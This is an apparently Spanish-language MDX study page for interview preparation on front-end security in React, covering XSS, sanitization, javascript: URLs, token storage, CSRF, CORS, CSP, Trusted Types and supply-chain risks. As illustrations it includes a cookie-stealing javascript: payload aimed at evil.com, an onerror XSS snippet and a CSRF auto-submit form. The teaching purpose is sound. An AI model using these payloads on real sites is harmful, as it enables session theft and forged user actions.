@@ -1,0 +1,429 @@
+import { Example, Live, Run, Pitfall, SayIt, Tip, Compare, Bad, Good } from "../app/study";
+import { EscapedText, SafeLink, SanitizedHtml, UnsafeHtml } from "./security.examples";
+
+export const meta = {
+  title: "Seguridad en el front end",
+  section: "security",
+  order: 10,
+  summary:
+    "XSS y cómo te protege React, dangerouslySetInnerHTML con sanitización, URLs javascript:, dónde guardar tokens, secretos en el bundle, CSRF, CORS, CSP, Trusted Types, dependencias y apps embebidas en otro producto.",
+};
+
+## ¿Qué es XSS y cómo te protege React?
+
+**XSS** (_Cross-Site Scripting_) es la vulnerabilidad más común del front end: un atacante consigue que **su JavaScript se ejecute en la página de otro usuario**. Por ejemplo, escribe un comentario con `<img src=x onerror="…">` y, si la app inserta ese texto como HTML, el código corre en el navegador de cada persona que abre el comentario, **con su sesión**: puede leer datos de la página, hacer peticiones en su nombre o robar tokens accesibles desde JS.
+
+Tipos:
+
+- **Stored** (almacenado): el código malicioso se guarda en la base de datos (un comentario, un nombre de proyecto) y se sirve a otros usuarios.
+- **Reflected** (reflejado): viene en la URL (`?q=<script>…`) y la página lo muestra.
+- **DOM-based**: el propio JavaScript del front toma datos de una fuente controlable (`location.hash`, `postMessage`) y los mete en el DOM con `innerHTML`.
+
+**Cómo protege React**: todo lo que renderizas entre llaves (`{comment}`) se trata como **texto**. React lo inserta con `textContent`, no con `innerHTML`, así que los caracteres `<`, `>` y `"` se muestran tal cual y nunca se interpretan como etiquetas. También escapa los valores de los atributos.
+
+La protección **desaparece** cuando te sales de ese camino:
+
+- `dangerouslySetInnerHTML`,
+- `href` o `src` con URLs que vienen del usuario,
+- tocar el DOM directamente (`ref.current.innerHTML = …`, `document.write`, `insertAdjacentHTML`),
+- `eval`, `new Function`, `setTimeout("string")`,
+- librerías que manipulan el DOM por su cuenta.
+
+<Example title="React muestra el HTML como texto">
+
+```tsx
+const comment = `<img src="x" onerror="document.title='hackeado'">`;
+
+<div>{comment}</div>; // se ve el texto literal: no se ejecuta nada
+```
+
+<Live hint="edita el HTML: nunca se interpreta">
+  <EscapedText />
+</Live>
+
+</Example>
+
+<SayIt>
+  XSS is when an attacker gets their script to run in another user's browser, usually through
+  content like a comment. React protects me by escaping everything rendered in JSX: it's inserted as
+  text, never parsed as HTML. The risk comes back with dangerouslySetInnerHTML, user-controlled URLs
+  or direct DOM manipulation.
+</SayIt>
+
+## ¿Cómo inyectar HTML en un componente y qué riesgo tiene?
+
+A veces necesitas renderizar HTML de verdad: el contenido de un editor de texto enriquecido, la descripción de un ticket, un email. React lo permite con `dangerouslySetInnerHTML={{ __html: html }}`. El nombre es largo y feo **a propósito**: obliga a escribirlo con intención y llama la atención en un code review.
+
+Si ese HTML viene de un usuario (o de cualquier lugar que no controlas al 100%), **hay que sanitizarlo**: pasarlo por una función que elimina todo lo peligroso (`<script>`, atributos `on*`, `javascript:` en enlaces, `<iframe>`, `<style>`) y deja solo lo permitido.
+
+- Usa **DOMPurify**, la librería estándar y mantenida: `DOMPurify.sanitize(html)`. Cubre muchísimos trucos (SVG, namespaces, mutaciones del parser) que un sanitizador casero no ve.
+- El enfoque correcto es una **lista de permitidos** (_allowlist_: solo estas etiquetas y atributos), nunca una lista de prohibidos: siempre hay una etiqueta o atributo nuevo que no pensaste.
+- Sanitiza **en el momento de renderizar** (y, si puedes, también en el servidor al guardar).
+- Si solo necesitas formato simple, considera **Markdown** con un renderer que no permita HTML crudo.
+
+En este repo, `src/07-security/sanitize.ts` implementa un sanitizador mínimo con allowlist (con tests) para entender la idea; en producción, DOMPurify.
+
+<Example title="el mismo HTML, sin y con sanitizar">
+
+<Compare>
+<Bad>
+
+```tsx
+<div dangerouslySetInnerHTML={{ __html: comment.body }} />
+```
+
+</Bad>
+<Good>
+
+```tsx
+import DOMPurify from "dompurify";
+
+<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(comment.body) }} />;
+```
+
+</Good>
+</Compare>
+
+<Live hint="activa la casilla: el onerror cambia el título de la pestaña">
+  <UnsafeHtml />
+</Live>
+
+<Live hint="sanitizado: el formato queda, el onerror y el javascript: desaparecen">
+  <SanitizedHtml />
+</Live>
+
+</Example>
+
+<SayIt>
+  dangerouslySetInnerHTML is the escape hatch to render real HTML, and the name is a warning. If the
+  HTML comes from users, I always sanitize it with DOMPurify, which uses an allowlist of tags and
+  attributes and strips scripts, event handlers and javascript URLs.
+</SayIt>
+
+## ¿Por qué son peligrosas las URLs `javascript:`?
+
+Un enlace con `href="javascript:…"` **ejecuta código** al hacer clic. Si dejas que el usuario ponga la URL de su perfil o de un enlace en un comentario, puede escribir `javascript:fetch('https://evil.com?c='+document.cookie)` y esperar a que otro haga clic. `data:text/html,…` tiene riesgos parecidos.
+
+React **escapa** el valor del atributo, pero escapar no sirve aquí: `javascript:alert(1)` no tiene caracteres especiales. Desde React 16.9 hay un warning, y **React 19 bloquea** las URLs `javascript:` en `href` (las reemplaza por una que lanza un error). Igual conviene validar el **esquema** tú mismo, porque la URL también puede terminar en otros lugares (un `window.open`, un `location.href`, un email).
+
+La validación correcta es una **allowlist de protocolos** parseando la URL con `new URL()`, no un `startsWith("javascript")` (que se salta con mayúsculas, espacios o tabs).
+
+Bonus: los enlaces a sitios externos con `target="_blank"` llevan `rel="noopener noreferrer"` para que la página nueva no pueda controlar la tuya con `window.opener`. Los navegadores modernos ya aplican `noopener` por defecto, pero es buena práctica explícita.
+
+<Example title="validar el esquema de una URL">
+
+```ts
+export function isSafeUrl(value: string): boolean {
+  try {
+    const url = new URL(value, "https://example.com"); // base para URLs relativas
+    return ["http:", "https:", "mailto:"].includes(url.protocol);
+  } catch {
+    return false;
+  }
+}
+```
+
+<Live hint="prueba JaVaScRiPt:alert(1), https://tempo.io y data:text/html,hola">
+  <SafeLink />
+</Live>
+
+</Example>
+
+<SayIt>
+  A javascript: URL in an href runs code on click, and escaping doesn't help because it has no
+  special characters. React 19 blocks them, but I still validate user URLs with an allowlist of
+  protocols like http, https and mailto, parsing them with the URL constructor.
+</SayIt>
+
+## ¿Dónde guardas un token de sesión?
+
+Las dos opciones habituales y su riesgo principal:
+
+|                   | Cookie `HttpOnly`                                                                                   | `localStorage` / `sessionStorage`                                       |
+| ----------------- | --------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------- |
+| ¿JS puede leerla? | **No**                                                                                              | Sí, cualquier script de la página                                       |
+| Si hay un XSS…    | El atacante no puede **robar** el token (sí puede hacer peticiones mientras la página está abierta) | El atacante lo **roba** y lo usa desde cualquier lugar hasta que expire |
+| Se envía          | Automáticamente en cada petición al dominio                                                         | Tú lo agregas al header `Authorization`                                 |
+| Riesgo de CSRF    | Sí, mitigado con `SameSite`                                                                         | No                                                                      |
+
+La recomendación habitual es **cookie `HttpOnly; Secure; SameSite=Lax`** (o `Strict`) emitida por el servidor:
+
+- `HttpOnly`: invisible para JavaScript.
+- `Secure`: solo viaja por HTTPS.
+- `SameSite`: limita el envío desde otros sitios (ver CSRF).
+
+Un patrón común en SPAs: un **access token de vida corta en memoria** (una variable, no en storage) y un **refresh token en cookie `HttpOnly`** para renovarlo. Y ninguna opción reemplaza evitar el XSS: si hay XSS, el atacante puede actuar como el usuario igual.
+
+<Example title="cualquier script puede leer localStorage">
+
+```http
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
+```
+
+<Run
+  label="Leer lo que un script inyectado vería"
+  run={(log) => {
+    localStorage.setItem("demo-token", "eyJhbGciOi...secreto");
+    log("localStorage:", localStorage.getItem("demo-token"));
+    log("document.cookie:", document.cookie || "(vacío: las cookies HttpOnly no aparecen aquí)");
+    localStorage.removeItem("demo-token");
+  }}
+/>
+
+</Example>
+
+<SayIt>
+  I prefer HttpOnly, Secure, SameSite cookies set by the server, because JavaScript can't read them,
+  so an XSS can't steal the token. Anything in localStorage can be read by any script on the page. A
+  common setup is a short-lived access token in memory and a refresh token in an HttpOnly cookie.
+</SayIt>
+
+## ¿Puede haber secretos en el front end?
+
+**No.** Todo lo que llega al navegador es **público**: el bundle de JavaScript, las variables de entorno que el bundler inyecta, las respuestas de la API, los source maps. Cualquiera puede abrir DevTools y leerlo, aunque esté minificado.
+
+- Las variables con prefijo **`VITE_`** (Vite), **`NEXT_PUBLIC_`** (Next.js) o `REACT_APP_` (Create React App) se **copian dentro del bundle**. Ese prefijo existe justamente para que no expongas otras por accidente.
+- En el front solo van claves **pensadas para ser públicas**: el _client-side ID_ de un SDK de feature flags, la clave publicable de Stripe, el DSN de Sentry.
+- Las claves secretas (de una API de pago, de la base de datos, de un servicio de IA) se quedan en el **servidor**. Si el front necesita esa API, llama a **tu backend**, que agrega la clave (un proxy o _backend for frontend_).
+- Los archivos `.env` con secretos van en `.gitignore`, y conviene un escáner de secretos en CI (GitHub secret scanning, gitleaks).
+
+<Example title="lo que termina en el bundle">
+
+<Compare>
+<Bad>
+
+```ts
+// cualquiera puede leerla en DevTools → Sources
+const res = await fetch("https://api.openai.com/v1/…", {
+  headers: { Authorization: `Bearer ${import.meta.env.VITE_OPENAI_KEY}` },
+});
+```
+
+</Bad>
+<Good>
+
+```ts
+// el backend tiene la clave; el front solo habla con él
+const res = await fetch("/api/summarize", { method: "POST", body });
+```
+
+</Good>
+</Compare>
+
+</Example>
+
+<SayIt>
+  There are no secrets in the front end: anything in the bundle, including VITE_ or NEXT_PUBLIC_
+  variables, is public. Only publishable keys go there. Secret keys stay on the server, and the
+  front end calls our own backend, which adds them.
+</SayIt>
+
+## ¿Qué es CSRF y cómo se previene?
+
+**CSRF** (_Cross-Site Request Forgery_): un sitio malicioso hace que el navegador de la víctima **envíe una petición a tu app**, y el navegador adjunta **automáticamente las cookies** de tu dominio. Por ejemplo, `evil.com` tiene un formulario oculto que se envía solo a `tuapp.com/api/delete-account`. El servidor ve una cookie de sesión válida y lo ejecuta. El atacante no puede **leer** la respuesta, pero la acción ya ocurrió.
+
+Solo afecta a la autenticación por **cookies** (un token que tú pones a mano en el header `Authorization` no se envía solo).
+
+Defensas, que se combinan:
+
+- **`SameSite` en la cookie de sesión**:
+  - `Strict`: nunca se envía en peticiones que vienen de otro sitio (ni al llegar por un enlace).
+  - `Lax`: se envía en navegaciones de nivel superior con `GET` (hacer clic en un enlace), pero no en `POST` desde otro sitio, ni en `fetch` o iframes. Chrome aplica `Lax` por defecto a las cookies que no dicen nada.
+  - `None`: se envía siempre (requiere `Secure`); para casos de terceros.
+- **Token anti-CSRF**: el servidor genera un valor aleatorio que el front envía en un header o campo; otro sitio no puede conocerlo.
+- **Que los `GET` no cambien nada**: solo `POST`/`PUT`/`DELETE` modifican datos.
+- **Revisar `Origin`** en el servidor.
+
+<Example title="la cookie que lo previene">
+
+```http
+Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax
+```
+
+```html
+<!-- en evil.com: con SameSite=Lax, este POST llega SIN la cookie de sesión -->
+<form action="https://tuapp.com/api/delete-account" method="POST">…</form>
+<script>
+  document.forms[0].submit();
+</script>
+```
+
+</Example>
+
+<SayIt>
+  CSRF is when another site makes the user's browser send a request to our app with their cookies
+  attached. It only affects cookie-based auth. The main defense is SameSite cookies, Lax or Strict,
+  plus anti-CSRF tokens and making sure GET requests never change data.
+</SayIt>
+
+## ¿Qué es CORS?
+
+Por la **Same-Origin Policy**, el JavaScript de una página **no puede leer respuestas** de otro origen (otro esquema, dominio o puerto). `app.com` no puede hacer `fetch("https://api.otro.com")` y leer el resultado. Protege al usuario: sin ella, cualquier página podría leer tu correo usando tus cookies.
+
+**CORS** (_Cross-Origin Resource Sharing_) es el mecanismo para que un **servidor** diga "este otro origen sí puede leerme", con headers en la respuesta:
+
+- `Access-Control-Allow-Origin: https://app.com` (o `*` para APIs públicas sin credenciales).
+- `Access-Control-Allow-Credentials: true` si hay cookies (y entonces no se puede usar `*`).
+- Para peticiones "no simples" (un `PUT`, un header `Authorization`, JSON con `Content-Type: application/json`), el navegador envía antes una **petición preflight** `OPTIONS` y espera `Access-Control-Allow-Methods` y `Access-Control-Allow-Headers`.
+
+Puntos clave para la entrevista:
+
+- **Se configura en el servidor**, no se "arregla" en el front. Desactivar CORS en tu navegador solo esconde el problema.
+- **No es una protección del servidor**: `curl` o Postman ignoran CORS. Lo aplica el navegador para proteger al usuario.
+- En desarrollo, un **proxy** del dev server (Vite `server.proxy`) evita el problema haciendo que todo sea mismo origen.
+
+<Example title="preflight y respuesta">
+
+```http
+OPTIONS /api/projects
+Origin: https://app.com
+Access-Control-Request-Method: PUT
+Access-Control-Request-Headers: authorization, content-type
+
+HTTP/1.1 204 No Content
+Access-Control-Allow-Origin: https://app.com
+Access-Control-Allow-Methods: GET, PUT
+Access-Control-Allow-Headers: authorization, content-type
+```
+
+</Example>
+
+<SayIt>
+  Browsers block a page from reading responses from another origin. CORS is how a server opts in,
+  with headers like Access-Control-Allow-Origin, and for non-simple requests the browser sends a
+  preflight OPTIONS first. It's configured on the server, and it protects users, not the server,
+  since tools like curl ignore it.
+</SayIt>
+
+## ¿Qué es la Content Security Policy (CSP)?
+
+La **CSP** es un header HTTP (`Content-Security-Policy`) con el que el servidor le dice al navegador **de dónde puede cargar y ejecutar** cada tipo de recurso. Es una **segunda línea de defensa contra XSS**: aunque un atacante logre inyectar un `<script>` o un `onerror`, el navegador se niega a ejecutarlo si no cumple la política.
+
+Directivas principales:
+
+- `default-src 'self'`: por defecto, solo tu propio origen.
+- `script-src`: de dónde se aceptan scripts. Lo más robusto es una CSP **estricta** con **nonces** (`'nonce-r4nd0m'`, un valor aleatorio por respuesta que llevan tus `<script>`) o hashes, más `'strict-dynamic'`.
+- Sin `'unsafe-inline'` en `script-src`: bloquea los scripts inline y los atributos `onclick`/`onerror`, que es exactamente lo que usa el XSS típico.
+- `connect-src` (a dónde puede hacer `fetch`), `img-src`, `style-src`, `frame-ancestors` (quién puede meter tu página en un iframe, contra _clickjacking_).
+
+Para introducirla sin romper nada, se empieza con **`Content-Security-Policy-Report-Only`**: el navegador reporta las violaciones pero no bloquea.
+
+<Example title="una CSP estricta">
+
+```http
+Content-Security-Policy:
+  default-src 'self';
+  script-src 'nonce-r4nd0m' 'strict-dynamic';
+  object-src 'none';
+  base-uri 'none';
+  connect-src 'self' https://api.example.com;
+  frame-ancestors 'none'
+```
+
+</Example>
+
+<SayIt>
+  Content Security Policy is a header that tells the browser where scripts and other resources may
+  load from. It's a second layer against XSS: even if someone injects a script or an inline event
+  handler, the browser won't run it. I'd roll it out in report-only mode first, with a nonce-based
+  strict policy.
+</SayIt>
+
+## ¿Qué son los Trusted Types?
+
+**Trusted Types** es una API del navegador que ataca el XSS de tipo DOM en su origen. Se activa con CSP (`require-trusted-types-for 'script'`) y, a partir de ahí, los **sinks peligrosos** (`innerHTML`, `outerHTML`, `insertAdjacentHTML`, `eval`, el `src` de un script) **rechazan strings comunes**: solo aceptan objetos `TrustedHTML` / `TrustedScript` creados por una **política** que tú defines, normalmente pasando por DOMPurify.
+
+El beneficio es que la revisión de seguridad se reduce a las pocas políticas, en lugar de cada `innerHTML` del código y de las dependencias. React acepta un `TrustedHTML` en `dangerouslySetInnerHTML`. Está soportado en los navegadores basados en Chromium; para otros navegadores existe un polyfill y conviene revisar el soporte actual.
+
+<Example title="una política que sanitiza">
+
+```ts
+const policy = trustedTypes.createPolicy("sanitize", {
+  createHTML: (input) => DOMPurify.sanitize(input),
+});
+
+element.innerHTML = policy.createHTML(userHtml); // OK
+element.innerHTML = userHtml; // TypeError con Trusted Types activos
+```
+
+</Example>
+
+<SayIt>
+  Trusted Types makes dangerous DOM sinks like innerHTML reject plain strings. Only objects created
+  by a policy I define, which usually sanitizes with DOMPurify, are accepted. That turns security
+  review into reviewing a few policies instead of every innerHTML in the codebase.
+</SayIt>
+
+## ¿Cómo manejas la seguridad de las dependencias?
+
+Una app de React típica tiene cientos de dependencias transitivas, y cada una es código de terceros que corre con los mismos permisos que el tuyo. Ha habido ataques reales de **supply chain**: paquetes populares comprometidos, nombres parecidos (_typosquatting_), scripts de `postinstall` maliciosos.
+
+Prácticas:
+
+- **Lockfile** (`package-lock.json`) commiteado y `npm ci` en CI: siempre se instalan las mismas versiones.
+- **`npm audit`** y alertas automáticas (**Dependabot**, **Renovate**, Snyk) para vulnerabilidades conocidas.
+- **Antes de agregar una librería**: ¿está mantenida?, ¿cuántas descargas y mantenedores tiene?, ¿cuánto pesa?, ¿la necesito o son 20 líneas?
+- **Actualizar con frecuencia** en pasos pequeños, en lugar de saltos enormes una vez al año.
+- Scripts de terceros en la página (analytics, chat) con **Subresource Integrity** (`integrity="sha384-…"`) cuando se cargan de un CDN, y limitados por CSP.
+
+<Example title="SRI en un script externo">
+
+```html
+<script
+  src="https://cdn.example.com/lib@1.2.3/lib.min.js"
+  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
+  crossorigin="anonymous"
+></script>
+```
+
+</Example>
+
+<SayIt>
+  Dependencies are part of the attack surface. I keep a committed lockfile and use npm ci, run npm
+  audit and Dependabot or Renovate, update often in small steps, and evaluate a library's
+  maintenance and size before adding it.
+</SayIt>
+
+## ¿Qué cambia en una app embebida en otro producto (como Jira)?
+
+Una app que corre **dentro de otro producto** (una extensión de Jira o Confluence, un plugin de Slack) comparte la pantalla y los datos del usuario con el host. El host la aísla y le exige declarar qué necesita. En **Atlassian Forge**:
+
+- La interfaz de una app **Custom UI** corre en un **iframe aislado** (_sandbox_) con una CSP restrictiva, separado de la página de Jira.
+- La app no habla con Jira directamente desde el iframe: usa el **bridge** (`@forge/bridge`), con funciones como `invoke` (llamar a tu backend en Forge) o `requestJira` (llamar a la API de Jira **en nombre del usuario**, con sus permisos).
+- En el `manifest.yml` se declaran los **permisos**: los _scopes_ de la API (por ejemplo, leer o escribir en Jira) y los dominios externos a los que la app puede hacer peticiones. El administrador ve y acepta esos permisos al instalar.
+
+Buenas prácticas en ese contexto: pedir **el mínimo de permisos** necesario, no asumir que el usuario puede ver todo lo que la app puede ver (respetar los permisos de Jira), tratar los datos del host (títulos, descripciones de issues) como **entrada no confiable** al renderizarlos, y no guardar datos sensibles fuera de donde la plataforma lo permite.
+
+<Example title="permisos declarados en un manifest de Forge (simplificado)">
+
+```yaml
+permissions:
+  scopes:
+    - read:jira-work
+    - write:jira-work
+  external:
+    fetch:
+      backend:
+        - https://api.example.com
+```
+
+```ts
+import { requestJira } from "@forge/bridge";
+
+const res = await requestJira("/rest/api/3/myself"); // con los permisos del usuario
+```
+
+</Example>
+
+<Tip>
+  Si te preguntan detalles específicos de Forge que no conoces, es mejor decir cómo lo averiguarías
+  (la documentación de permisos y del bridge) que inventar. Lo importante es el principio: mínimo
+  privilegio y datos del host tratados como no confiables.
+</Tip>
+
+<SayIt>
+  An embedded app runs inside the host's product, so the host isolates it and makes it declare what
+  it needs. In Forge, Custom UI runs in a sandboxed iframe, talks to Jira through the bridge with
+  the user's permissions, and declares its scopes and external domains in the manifest. I'd request
+  the minimum permissions and treat host data as untrusted when rendering it.
+</SayIt>
